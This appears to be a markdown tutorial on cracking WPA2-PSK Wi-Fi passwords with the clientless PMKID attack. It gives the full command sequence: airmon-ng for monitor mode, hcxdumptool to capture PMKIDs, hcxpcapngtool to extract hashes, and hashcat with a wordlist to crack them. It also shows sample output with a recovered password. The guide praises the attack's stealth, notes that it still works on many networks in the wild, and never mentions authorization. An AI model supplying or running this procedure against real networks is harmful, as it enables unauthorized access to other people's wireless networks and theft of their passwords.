
# 🛡️ WPA2-PSK PMKID Attack – Offline, Clientless Method

## 🔍 What is the PMKID Attack?

The PMKID attack is a modern, stealthy method to obtain the WPA2-PSK password **without capturing a full handshake** and **without requiring a connected client**.

Instead, it abuses a feature in some APs where the **PMKID** is included in the first EAPOL message.

---

## 💡 Why use PMKID?

- ✅ No deauths needed
- ✅ No connected clients required
- ✅ Silent/stealthy
- ✅ Fully offline crack
- ✅ Faster and more scriptable than traditional handshake methods

---

## 🧠 How it Works

The PMKID (Pairwise Master Key Identifier) is generated using:

- The **SSID**
- The **MAC address of the AP (BSSID)**
- The **PSK (Pre-Shared Key)**

If the AP includes the PMKID in the EAPOL frames, it can be captured directly and cracked offline.

---

## ⚙️ Tools Required

- `hcxdumptool` – to capture PMKID packets
- `hcxpcapngtool` – to extract hash from the capture file
- `hashcat` – to perform the actual brute-force attack

---

## 🧭 Attack Flow

### 1. Put interface in monitor mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### 2. Capture PMKID using hcxdumptool

```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
```

Let it run for a bit while it passively collects PMKID packets.

### 3. Extract hash for cracking

```bash
hcxpcapngtool -o pmkid_hash.txt pmkid.pcapng
```

### 4. Crack the hash using hashcat

```bash
hashcat -m 16800 pmkid_hash.txt rockyou.txt
```

- `-m 16800`: mode for WPA-PMKID
- `rockyou.txt`: your wordlist

---

## 🧪 Output Example

```bash
Session..........: hashcat
Hash.Type........: WPA-PMKID-PBKDF2
Status...........: Cracked
Password.........: supersecurewifi
```

---

## 📌 Notes

- Not all APs expose PMKID — some models are immune
- Works best on modern routers using 802.11i
- Still valid for many networks in the wild

---

This is a passive, elegant, and powerful technique.  
No noise. No clients. Just results.

